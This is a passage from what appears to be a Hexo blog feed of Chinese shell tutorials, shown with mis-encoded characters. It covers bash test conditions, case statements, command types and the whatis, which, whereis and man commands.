class="built_in">echo</span> 0</span></span><br><span class="line"><span class="meta prompt_">else&gt; </span><span class="language-bash"><span class="keyword">fi</span></span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="æ¡ä»¶æµ‹è¯•">æ¡ä»¶æµ‹è¯•</h2><p>bash shell æä¾›äº†å¦ä¸€ç§æ¡ä»¶æµ‹è¯•æ–¹æ³•ï¼Œæ— éœ€åœ¨ if-then è¯­å¥ä¸­å£°æ˜ testå‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if [ condition ]</span><br><span class="line">then</span><br><span class="line"> commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>æ–¹æ‹¬å·å®šä¹‰äº†æµ‹è¯•æ¡ä»¶ã€‚æ³¨æ„ï¼Œç¬¬ä¸€ä¸ªæ–¹æ‹¬å·ä¹‹åå’Œç¬¬äºŒä¸ªæ–¹æ‹¬å·ä¹‹å‰å¿…é¡»åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™ã€‚test å‘½ä»¤å¯ä»¥åˆ¤æ–­ä¸‰ç±»æ¡ä»¶ï¼š</p><ol start="0" type="1"><li><p>æ–‡ä»¶æ¯”è¾ƒ</p><p>è¿™ä¸€ç±»æ¯”è¾ƒæµ‹è¯•å¾ˆæœ‰å¯èƒ½æ˜¯ shellç¼–ç¨‹ä¸­æœ€ä¸ºå¼ºå¤§ã€ä¹Ÿæ˜¯ç”¨å¾—æœ€å¤šçš„æ¯”è¾ƒå½¢å¼ã€‚å®ƒå…è®¸ä½ æµ‹è¯• Linuxæ–‡ä»¶ç³»ç»Ÿä¸Šæ–‡ä»¶å’Œç›®å½•çš„çŠ¶æ€ã€‚</p><p>| æ¯” è¾ƒ | æ è¿°| | -d file | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨å¹¶æ˜¯ä¸€ä¸ªç›®å½•| | -efile | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨| | -f file | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨å¹¶æ˜¯ä¸€ä¸ªæ–‡ä»¶| |-r file | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨å¹¶å¯è¯»| | -s file | æ£€æŸ¥ fileæ˜¯å¦å­˜åœ¨å¹¶éç©º| | -w file | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨å¹¶å¯å†™| | -x file | æ£€æŸ¥file æ˜¯å¦å­˜åœ¨å¹¶å¯æ‰§è¡Œ| | -O file | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨å¹¶å±å½“å‰ç”¨æˆ·æ‰€æœ‰| |-G file | æ£€æŸ¥ file æ˜¯å¦å­˜åœ¨å¹¶ä¸”é»˜è®¤ç»„ä¸å½“å‰ç”¨æˆ·ç›¸åŒ| | file1 -nt file2| æ£€æŸ¥ file1 æ˜¯å¦æ¯” file2 æ–°| | file1 -ot file2 | æ£€æŸ¥ file1 æ˜¯å¦æ¯”file2 æ—§|</p><p>æ³¨æ„ï¼šå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œ-nt æ¯”è¾ƒä¼šè¿”å›ä¸€ä¸ªé”™è¯¯çš„ç»“æœã€‚åœ¨ä½ å°è¯•ä½¿ç”¨-ntæˆ– -ot æ¯”è¾ƒæ–‡ä»¶ä¹‹å‰ï¼Œå¿…é¡»å…ˆç¡®è®¤æ–‡ä»¶æ˜¯å­˜åœ¨çš„</p></li><li><p>æ•°å€¼æ¯”è¾ƒ</p><p>é€‚ç”¨äºæ•´æ•°å’Œæ•´å‹å˜é‡ï¼Œ<strong>ä¸é€‚ç”¨äºæµ®ç‚¹æ•°</strong></p><table><thead><tr class="header"><th>æ¯” è¾ƒ</th><th>æ è¿°</th></tr></thead><tbody><tr class="odd"><td><code>n1 -eq n2</code></td><td>æ£€æŸ¥ n1 æ˜¯å¦ä¸ n2 ç›¸ç­‰</td></tr><tr class="even"><td><code>n1 -ge n2</code></td><td>æ£€æŸ¥ n1 æ˜¯å¦å¤§äºæˆ–ç­‰äº n2</td></tr><tr class="odd"><td><code>n1 -gt n2</code></td><td>æ£€æŸ¥ n1 æ˜¯å¦å¤§äº n2</td></tr><tr class="even"><td><code>n1 -le n2</code></td><td>æ£€æŸ¥ n1 æ˜¯å¦å°äºæˆ–ç­‰äº n2</td></tr><tr class="odd"><td><code>n1 -lt n2</code></td><td>æ£€æŸ¥ n1 æ˜¯å¦å°äº n2</td></tr><tr class="even"><td><code>n1 -ne n2</code></td><td>æ£€æŸ¥ n1 æ˜¯å¦ä¸ç­‰äº n2</td></tr></tbody></table></li><li><p>å­—ç¬¦ä¸²æ¯”è¾ƒ</p><table><thead><tr class="header"><th>æ¯” è¾ƒ</th><th>æ è¿°</th></tr></thead><tbody><tr class="odd"><td>str1 = str2</td><td>æ£€æŸ¥ str1 æ˜¯å¦å’Œ str2 ç›¸åŒ</td></tr><tr class="even"><td>str1 != str2</td><td>æ£€æŸ¥ str1 æ˜¯å¦å’Œ str2 ä¸åŒ</td></tr><tr class="odd"><td>str1 &lt; str2</td><td>æ£€æŸ¥ str1 æ˜¯å¦æ¯” str2 å°</td></tr><tr class="even"><td>str1 &gt; str2</td><td>æ£€æŸ¥ str1 æ˜¯å¦æ¯” str2 å¤§</td></tr><tr class="odd"><td>-n str1</td><td>æ£€æŸ¥ str1 çš„é•¿åº¦æ˜¯å¦é 0</td></tr><tr class="even"><td>-z str1</td><td>æ£€æŸ¥ str1 çš„é•¿åº¦æ˜¯å¦ä¸º 0</td></tr></tbody></table><p>æ³¨æ„ï¼š</p><ol type="1"><li><p>åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²çš„ç›¸ç­‰æ€§æ—¶ï¼Œæ¯”è¾ƒæµ‹è¯•ä¼šå°†æ‰€æœ‰çš„æ ‡ç‚¹å’Œå¤§å°å†™æƒ…å†µéƒ½è€ƒè™‘åœ¨å†…</p></li><li><p>ç©ºçš„å’Œæœªåˆå§‹åŒ–çš„å˜é‡ä¼šå¯¹ shellè„šæœ¬æµ‹è¯•é€ æˆç¾éš¾æ€§çš„å½±å“ã€‚å¦‚æœä¸æ˜¯å¾ˆç¡®å®šä¸€ä¸ªå˜é‡çš„å†…å®¹ï¼Œæœ€å¥½åœ¨å°†å…¶ç”¨äºæ•°å€¼æˆ–å­—ç¬¦ä¸²æ¯”è¾ƒä¹‹å‰å…ˆé€šè¿‡-næˆ–-z æ¥æµ‹è¯•ä¸€ä¸‹å˜é‡æ˜¯å¦å«æœ‰å€¼ã€‚</p></li><li><p>testå‘½ä»¤å’Œæµ‹è¯•è¡¨è¾¾å¼ä½¿ç”¨æ ‡å‡†çš„æ•°å­¦æ¯”è¾ƒç¬¦å·æ¥è¡¨ç¤ºå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œè€Œç”¨æ–‡æœ¬ä»£ç æ¥è¡¨ç¤ºæ•°å€¼æ¯”è¾ƒã€‚è¿™ä¸ªç»†å¾®çš„ç‰¹æ€§è¢«å¾ˆå¤šç¨‹åºå‘˜ç†è§£åäº†ã€‚å¦‚æœä½ å¯¹æ•°å€¼ä½¿ç”¨äº†æ•°å­¦è¿ç®—ç¬¦å·ï¼Œshellä¼šå°†å®ƒä»¬å½“æˆå­—ç¬¦ä¸²å€¼ï¼Œå¯èƒ½æ— æ³•å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚</p></li><li><p>å­—ç¬¦ä¸²å¤§å°æ¯”è¾ƒ</p><ol type="1"><li><p>å¤§äºå·å’Œå°äºå·å¿…é¡»è½¬ä¹‰ï¼Œå¦åˆ™ shellä¼šæŠŠå®ƒä»¬å½“ä½œé‡å®šå‘ç¬¦å·ï¼ŒæŠŠå­—ç¬¦ä¸²å€¼å½“ä½œæ–‡ä»¶åï¼›</p></li><li><p>å¤§äºå’Œå°äºé¡ºåºå’Œ sort å‘½ä»¤æ‰€é‡‡ç”¨çš„ä¸åŒã€‚</p><p>é™¤éä½ ç»å¸¸å¤„ç†å¤§å°å†™å­—æ¯ï¼Œå¦åˆ™å‡ ä¹é‡ä¸åˆ°ã€‚sortå‘½ä»¤å¤„ç†å¤§å†™å­—æ¯çš„æ–¹æ³•åˆšå¥½è·Ÿ test å‘½ä»¤ç›¸åã€‚åœ¨æ¯”è¾ƒæµ‹è¯•ä¸­ï¼Œå¤§å†™å­—æ¯è¢«è®¤ä¸ºæ˜¯å°äºå°å†™å­—æ¯çš„ã€‚ä½† sortå‘½ä»¤æ°å¥½ç›¸åã€‚å½“ä½ å°†åŒæ ·çš„å­—ç¬¦ä¸²æ”¾è¿›æ–‡ä»¶ä¸­å¹¶ç”¨ sortå‘½ä»¤æ’åºæ—¶ï¼Œå°å†™å­—æ¯ä¼šå…ˆå‡ºç°ã€‚è¿™æ˜¯ç”±å„ä¸ªå‘½ä»¤ä½¿ç”¨çš„æ’åºæŠ€æœ¯ä¸åŒé€ æˆçš„ã€‚</p></li></ol></li></ol></li></ol><h3 id="å¤åˆæ¡ä»¶æµ‹è¯•">å¤åˆæ¡ä»¶æµ‹è¯•</h3><p>if-then è¯­å¥å…è®¸ä½ ä½¿ç”¨å¸ƒå°”é€»è¾‘æ¥ç»„åˆæµ‹è¯•ã€‚æœ‰ä¸¤ç§å¸ƒå°”è¿ç®—ç¬¦å¯ç”¨ï¼š<code>[ condition1 ] &amp;&amp; [ condition2 ]</code><code>[ condition1 ] || [ condition2 ]</code></p><p>å¸ƒå°”é€»è¾‘æ˜¯ä¸€ç§èƒ½å¤Ÿå°†å¯èƒ½çš„è¿”å›å€¼ç®€åŒ–ä¸º TRUE æˆ– FALSE çš„æ–¹æ³•ã€‚</p><h3 id="if-then-é«˜çº§ç‰¹æ€§">if-then é«˜çº§ç‰¹æ€§</h3><p>bash shell æä¾›äº†ä¸¤é¡¹å¯åœ¨ if-then è¯­å¥ä¸­ä½¿ç”¨çš„é«˜çº§ç‰¹æ€§ï¼š</p><ul><li>ç”¨äºæ•°å­¦è¡¨è¾¾å¼çš„åŒæ‹¬å·</li><li>ç”¨äºé«˜çº§å­—ç¬¦ä¸²å¤„ç†åŠŸèƒ½çš„åŒæ–¹æ‹¬å·</li></ul><h4 id="ç®—æ•°æ‰©å±•">ç®—æ•°æ‰©å±•</h4><p>ç®—æ•°æ‰©å±•(åŒæ‹¬å·)å…è®¸ä½ åœ¨æ¯”è¾ƒè¿‡ç¨‹ä¸­ä½¿ç”¨é«˜çº§æ•°å­¦è¡¨è¾¾å¼ã€‚testå‘½ä»¤åªèƒ½åœ¨æ¯”è¾ƒä¸­ä½¿ç”¨ç®€å•çš„ç®—æœ¯æ“ä½œã€‚å…·ä½“å¯ä»¥è¿›è¡Œçš„æ“ä½œæˆ‘å·²ç»åœ¨ - [ ]shell æ•°å­¦è¿ç®— å†™åˆ°</p><h4 id="åŒæ–¹æ‹¬å·">åŒæ–¹æ‹¬å·</h4><p>åŒæ–¹æ‹¬å·å‘½ä»¤æä¾›äº†é’ˆå¯¹å­—ç¬¦ä¸²æ¯”è¾ƒçš„é«˜çº§ç‰¹æ€§ã€‚åŒæ–¹æ‹¬å·å‘½ä»¤çš„æ ¼å¼å¦‚ä¸‹ï¼š<code>[[ expression ]]</code></p><p>åŒæ–¹æ‹¬å·é‡Œçš„ expression ä½¿ç”¨äº† testå‘½ä»¤ä¸­é‡‡ç”¨çš„æ ‡å‡†å­—ç¬¦ä¸²æ¯”è¾ƒã€‚ä½†å®ƒæä¾›äº† testå‘½ä»¤æœªæä¾›çš„å¦ä¸€ä¸ªç‰¹æ€§â€”â€”æ¨¡å¼åŒ¹é…ï¼ˆpattern matchingï¼‰ã€‚</p><blockquote><p>è¯´æ˜ï¼šåŒæ–¹æ‹¬å·åœ¨ bash shell ä¸­å·¥ä½œè‰¯å¥½ã€‚ä¸è¿‡è¦å°å¿ƒï¼Œä¸æ˜¯æ‰€æœ‰çš„ shelléƒ½æ”¯æŒåŒæ–¹æ‹¬å·ã€‚</p></blockquote><h4 id="æ¡ä»¶æµ‹è¯•æ€»ç»“">æ¡ä»¶æµ‹è¯•æ€»ç»“</h4><p>æ­£å¸¸æ“ä½œç›´æ¥ç”¨ç®—æ•°æ‰©å±• <code>(())</code>ï¼Œå­—ç¬¦ä¸²ç®€å•æ¨¡å¼åŒ¹é…ä½¿ç”¨åŒæ–¹æ‹¬å· <code>[[]]</code>ã€‚</p><h2 id="case-åˆ†æ”¯">case åˆ†æ”¯</h2><p>case å‘½ä»¤ä¼šé‡‡ç”¨åˆ—è¡¨æ ¼å¼æ¥æ£€æŸ¥å•ä¸ªå˜é‡çš„å¤šä¸ªå€¼ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">case variable in</span><br><span class="line">pattern1 | pattern2)</span><br><span class="line">    commands1;;</span><br><span class="line">pattern3)</span><br><span class="line">    commands2;;</span><br><span class="line">*)</span><br><span class="line">    commands;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>å‘½ä»¤ä¼šå°†æŒ‡å®šçš„å˜é‡ä¸ä¸åŒæ¨¡å¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå˜é‡å’Œæ¨¡å¼æ˜¯åŒ¹é…çš„ï¼Œé‚£ä¹ˆshellä¼šæ‰§è¡Œä¸ºè¯¥æ¨¡å¼æŒ‡å®šçš„å‘½ä»¤ã€‚å¯ä»¥é€šè¿‡ç«–çº¿æ“ä½œç¬¦åœ¨ä¸€è¡Œä¸­åˆ†éš”å‡ºå¤šä¸ªæ¨¡å¼æ¨¡å¼ã€‚æ˜Ÿå·ä¼šæ•è·æ‰€æœ‰ä¸å·²çŸ¥æ¨¡å¼ä¸åŒ¹é…çš„å€¼ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li>Linux å‘½ä»¤è¡Œä¸ Shell è„šæœ¬ç¼–ç¨‹å¤§å…¨</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell å‘½ä»¤ç±»å‹åŠå¸®åŠ©æ–‡æ¡£</title>
      <link href="/blog/2020/07/17/programming/shell/1.help/"/>
      <url>/blog/2020/07/17/programming/shell/1.help/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ³¨: æœ¬æ–‡åœ¨ Manjaro Linuxä¸‹å®Œæˆï¼Œå…¶ç»“æœä¸ä¸€å®šä¸å‘è¡Œç‰ˆä¸€è‡´ï¼Œè¯·çŸ¥æ‚‰ã€‚</p></blockquote><h2 id="command-types">command types</h2><p>æ ¹æ® <code>man type</code> å¾—:</p><blockquote><p>The standard output of type contains information about each operandin an unspecified format. The information provided typically identifiesthe operand as a shell built-in, function, alias or keyword, and whereapplicable, may display the operand's pathname.</p></blockquote><p>æˆ‘ä»¬å¾—çŸ¥å‘½ä»¤æœ‰äº”ç§ç±»å‹ï¼šshell built-in, functionï¼Œ executable binary,alias, keyword. æ³¨æ„ï¼šå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå³ï¼šå¤–éƒ¨å‘½ä»¤ï¼Œåœ¨ä½¿ç”¨<code>type</code> æ—¶ï¼Œå°±æ˜¯æ˜¾ç¤ºäºŒè¿›åˆ¶æ‰€åœ¨è·¯å¾„ã€‚<code>/usr/bin</code>ç›®å½•ä¸‹å­˜å‚¨çš„æ–‡ä»¶å°±æ˜¯å¯æ‰§è¡Œç¨‹åºã€‚è¿™äº›å¯æ‰§è¡Œç¨‹åºéƒ½æ˜¯ä¸åŒç¼–ç¨‹è¯­è¨€å¼€å‘å‡ºæ¥çš„ã€‚</p><ol type="1"><li><p><code>shell built-in</code> å†…ç½®åœ¨ shell ä¸­å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯ shellæœ¬èº«æä¾›çš„ï¼Œè€Œä¸æ˜¯é€šè¿‡ shell è°ƒç”¨çš„å…¶ä»–åœ°æ–¹çš„äºŒè¿›åˆ¶æ–‡ä»¶ç­‰ã€‚ ä¾‹å¦‚ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:31:09]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> <span class="built_in">printf</span> <span class="built_in">read</span></span></span><br><span class="line">printf is a shell builtin</span><br><span class="line">read is a shell builtin</span><br></pre></td></tr></table></figure></p></li><li><p><code>function</code></p><p>é…ç½®åœ¨ç¯å¢ƒå˜é‡ä¸­çš„ shell å‡½æ•°ï¼Œåé¢æˆ‘ä»¬å­¦ä¹  shellç¼–ç¨‹çš„æ—¶å€™å°±å­¦åˆ°ã€‚</p><p>ä¾‹å¦‚ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:40:57]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="function"><span class="title">demoFun</span></span>()&#123;</span></span><br><span class="line">    echo &quot;è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ª shell å‡½æ•°\!&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:41:39]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> demoFun</span></span><br><span class="line">demoFun is a shell function</span><br></pre></td></tr></table></figure></p></li><li><p>executable binary å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œshellè°ƒç”¨è¿è¡Œçš„å¤–éƒ¨å‘½ä»¤ã€‚</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [9:44:28]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> find <span class="built_in">cat</span></span></span><br><span class="line">find is /usr/bin/find</span><br><span class="line">cat is /usr/bin/cat</span><br></pre></td></tr></table></figure></p></li><li><p><code>alias</code> ä¸åŒ shell æˆ–è€…ç”¨æˆ·è‡ªå®šä¹‰çš„åˆ«åï¼Œä¾‹å¦‚ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> ll</span></span><br><span class="line">ll is an alias for ls -lh</span><br></pre></td></tr></table></figure></p></li><li><p>reserved word (keyword)</p><p>shell å…³é”®å­—(ä¿ç•™å­—)</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">type</span> <span class="keyword">for</span></span></span><br><span class="line">for is a reserved word</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="whatis">whatis</h2><p>éœ€è¦å¿«é€Ÿäº†è§£æŸä¸ªå‘½ä»¤çš„ä½œç”¨ï¼Œä½¿ç”¨ <code>whatis</code>å‘½ä»¤ï¼Œå®ƒé€šè¿‡ç›´æ¥æ˜¾ç¤º manual page çš„ç¬¬ä¸€è¡Œï¼Œæ¥ç»™å‡ºæŸä¸ªå‘½ä»¤çš„ç®€è¦è¯´æ˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whatis whatis</span></span><br><span class="line">whatis (1)           - display one-line manual page descriptions</span><br></pre></td></tr></table></figure><p><code>whatis</code> ä¼šæ˜¾ç¤ºå‘½ä»¤æ‰€åœ¨çš„å…·ä½“çš„æ–‡æ¡£ç±»åˆ«ï¼Œä¸Šé¢è¿™ä¸ª<code>(1)</code> è¯´æ˜å‘½ä»¤åœ¨ç¬¬ä¸€ä¸ªç±»åˆ«ã€‚ç±»åˆ«ç›¸å…³çš„çŸ¥è¯†åœ¨ä¸‹é¢<code>man</code> ä¸­æœ‰è¯¦ç»†å†™åˆ°ã€‚</p><h2 id="which">which</h2><p>é€šè¿‡ <code>man which</code> å¯ä»¥å¾—åˆ°:</p><blockquote><p>It does this by searching for an executable or script in thedirectories listed in the environment variable PATH using the samealgorithm as bash(1).</p></blockquote><p>å¯è§ <code>which</code> é€šè¿‡æœç´¢ç¯å¢ƒå˜é‡ <code>PATH</code>åˆ—å‡ºçš„äºŒè¿›åˆ¶æˆ–è„šæœ¬çš„ç›®å½•æ¥ç»™å‡ºæŒ‡å®šå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$PATH</span></span></span><br><span class="line">/home/violetv/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/var/lib/snapd/snap/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:13:45]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> python</span></span><br><span class="line">/usr/bin/python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:14:51]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /usr/bin/python</span></span><br><span class="line">lrwxrwxrwx 1 root root 7  5æœˆ 18 02:15 /usr/bin/python -&gt; python3</span><br></pre></td></tr></table></figure><p>è€Œä¸”æ­£å› ä¸ºå®ƒç»™å‡ºçš„æ˜¯åŠ å…¥ç¯å¢ƒå˜é‡çš„å‘½ä»¤çš„æ–‡ä»¶ï¼Œå› æ­¤å½“æˆ‘ä»¬å®‰è£…çš„è½¯ä»¶æœ‰æ—¶ä¸æ­¢ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¯èƒ½å®‰è£…äº†å¥½å‡ ä¸ªç‰ˆæœ¬æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>which cmd</code> æ‰¾åˆ°æˆ‘ä»¬è¿è¡Œè¯¥è½¯ä»¶çš„æ—¶å€™ï¼Œé»˜è®¤æ‰§è¡Œçš„ç‰ˆæœ¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll `<span class="built_in">which</span> python`</span></span><br><span class="line">lrwxrwxrwx 1 root root 7  5æœˆ 18 02:15 /usr/bin/python -&gt; python3</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æ¼”ç¤º">ä½¿ç”¨æ¼”ç¤º</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:09:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> <span class="built_in">cat</span></span></span><br><span class="line">/usr/bin/cat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:09:58]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> <span class="built_in">read</span></span></span><br><span class="line">read: shell built-in command</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:10:03]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> <span class="keyword">for</span></span></span><br><span class="line">for: shell reserved word</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:10:09]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> demoFun</span></span><br><span class="line">demoFun () &#123;</span><br><span class="line">        echo &quot;è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ä¸ª shell å‡½æ•°!&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:10:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> ll</span></span><br><span class="line">ll: aliased to ls -lh</span><br></pre></td></tr></table></figure><h2 id="whereis">whereis</h2><p>é€šè¿‡ <code>man whereis</code> æˆ‘ä»¬å‘ç° Descriptionä¸­æœ‰è¿™æ ·ä¸¤å¥è¯ï¼š</p><blockquote><p>whereis locates the binary, source and manual files for the specifiedcommand names.</p></blockquote><blockquote><p>whereis then attempts to locate the desired program in the standardLinux places, and in the places specified by $PATH and $MANPATH.</p></blockquote><p><code>whereis</code> é€šè¿‡æœç´¢<code>the standard Linux places</code>ã€<code>$PATH</code> å’Œ<code>$MANPATH</code> åˆ—å‡ºçš„ä½ç½®æ¥è¿›è¡Œå®šä½ï¼Œä¸»è¦å®šä½ä¸‰ç±»æ–‡ä»¶:<code>binary, source and manual files</code>ã€‚</p><p>ä¸¤ä¸ªä½¿ç”¨åœºæ™¯:</p><ol type="1"><li>å®‰è£…äº†å¤šä¸ªç‰ˆæœ¬çš„ python ä¹‹ç±»çš„ï¼Œçœ‹ä¸€ä¸‹å®‰è£…äº†å“ªäº›å…·ä½“çš„ç‰ˆæœ¬å·</li><li>æŸ¥çœ‹ python åº“æ–‡ä»¶ä½ç½®ï¼Œä¾‹å¦‚: <code>usr/lib/python3.8</code>ä¹‹ç±»çš„</li></ol><h2 id="man">man</h2><blockquote><p>Man pages are the UNIX traditional way of distributing documentationabout programs. The term "man page" itself is short for "manual page",as they correspond to the pages of the printed manual; the man pages"sections" (1 for commands, 2 for system calls, etc.) correspond tosections in the full UNIX manual.</p></blockquote><p>åœ¨ man çš„å¸®åŠ©æ‰‹å†Œä¸­ï¼Œå°†å¸®åŠ©æ–‡æ¡£åˆ†ä¸ºäº† 9ä¸ªç±»åˆ«ï¼Œå¯¹äºæœ‰çš„å…³é”®å­—å¯èƒ½å­˜åœ¨å¤šä¸ªç±»åˆ«ä¸­ï¼Œæˆ‘ä»¬å°±éœ€è¦æŒ‡å®šç‰¹å®šçš„ç±»åˆ«æ¥æŸ¥çœ‹ï¼›ï¼ˆä¸€èˆ¬æˆ‘ä»¬æŸ¥è¯¢ bash å‘½ä»¤ï¼Œå½’ç±»åœ¨ 1ç±»ä¸­ï¼‰ï¼›</p><p>man é¡µé¢æ‰€å±çš„åˆ†ç±»æ ‡è¯†(å¸¸ç”¨çš„æ˜¯åˆ†ç±» 1 å’Œåˆ†ç±» 3)</p><p>(1)ã€ç”¨æˆ·å¯ä»¥æ“ä½œçš„å‘½ä»¤æˆ–è€…æ˜¯å¯æ‰§è¡Œæ–‡ä»¶(2)ã€ç³»ç»Ÿæ ¸å¿ƒå¯è°ƒç”¨çš„å‡½æ•°ä¸å·¥å…·ç­‰ (3)ã€ä¸€äº›å¸¸ç”¨çš„å‡½æ•°ä¸æ•°æ®åº“(4)ã€è®¾å¤‡æ–‡ä»¶çš„è¯´æ˜ (5)ã€è®¾ç½®æ–‡ä»¶æˆ–è€…æŸäº›æ–‡ä»¶çš„æ ¼å¼ 